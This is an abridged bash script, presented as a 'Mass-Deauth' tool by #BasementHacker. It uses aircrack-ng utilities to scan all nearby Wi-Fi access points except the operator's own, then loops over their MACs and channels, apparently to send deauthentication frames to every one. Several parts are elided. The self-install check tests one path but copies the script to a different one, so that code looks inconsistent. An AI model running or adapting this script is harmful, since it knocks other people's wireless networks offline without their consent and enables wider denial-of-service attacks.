#!/bin/bash
# Mass-Deauth Script by #BasementHacker <http://basement-hacker.com>
# Send all complaints and improvements on GitHub <https://github.com/BasementHacker/mass-deauthenticate/>
# Licensed as GPLv3 by #BasementHacker
# Version 1.1 BETA (July 04, 2017)
...
for i in airmon-ng aireplay-ng iw ip iwlist; do
...
if [[ ! -e '/usr/local/bin/mass-deauth' && $ask_to_install = '1' ]];then
	...
	if [[ $install = Y || $install = y ]] ; then
		cp "$0" /usr/local/sbin/mass-deauthenticate.sh
		chmod +x /usr/local/sbin/mass-deauthenticate.sh
...
while true; do
	rmlogs
    ip link set "$MIFACE" up &> /dev/null; sleep 0.5
	iwlist "$WIFACE" scan > /tmp/scan.tmp
	#awk --posix '$5 ~ /[0-9a-zA-F]{2}:/ && $5 !~ /'$ourAPmac'/ {print $5}' /tmp/scan.tmp > /tmp/APmacs.lst
	grep "Address:" /tmp/scan.tmp | grep -v "$ourAPmac" | cut -b 30-60 > /tmp/APmacs.lst
	grep "Channel:" /tmp/scan.tmp | cut -b 29 > /tmp/APchannels.lst
	...
	for (( b=1; b<=lineNum; b++ )); do
			scan1="1" && export scan1
			curCHAN=$(head -n $b < /tmp/APchannels.lst) && export curCHAN
